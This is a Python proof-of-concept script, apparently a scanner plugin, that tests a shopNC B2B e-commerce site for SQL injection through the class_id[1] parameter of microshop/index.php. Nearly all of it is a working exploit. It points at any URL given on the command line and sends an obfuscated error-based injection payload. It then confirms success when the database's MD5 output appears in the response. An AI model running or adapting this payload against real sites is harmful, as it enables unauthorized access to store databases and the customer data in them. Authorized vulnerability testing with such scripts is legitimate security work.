#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: shopNC B2B版 index.php SQL注入
referer: http://www.wooyun.org/bugs/wooyun-2015-0124172
author: Lucifer
description: 文件index.php中,参数class_id[1]存在SQL注入。
'''
import sys
import requests
import warnings
from termcolor import cprint

class shopnc_index_class_id_sqli_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/microshop/index.php?act=personal&class_id[0]=exp&class_id[1]=1)And(Select/**/1/**/From(Select/**/Count(*),Concat((Select(Select(Select/**/Concat(0x7e,Md5(1234),0x7e)))From/**/information_schema.tables/**/limit/**/0,1),Floor(Rand(0)*2))x/**/From/**/Information_schema.tables/**/group/**/by/**/x)a)%23"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"81dc9bdb52d04dc20036dbd8313ed055" in req.text:
                cprint("[+]存在shopNC B2B版 index.php SQL注入漏洞...(高危)\tpayload: "+vulnurl, "red")
                return True, vulnurl, "shopNC B2B版 index.php SQL注入", str(payload), req.text
            else:
                cprint("[-]不存在shopnc_index_class_id_sqli漏洞", "white", "on_grey")
                return False, None, None, None, None

        except:
            cprint("[-] "+__file__+"====>可能不存在漏洞", "cyan")
            return False, None, None, None, None

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = shopnc_index_class_id_sqli_BaseVerify(sys.argv[1])
    testVuln.run()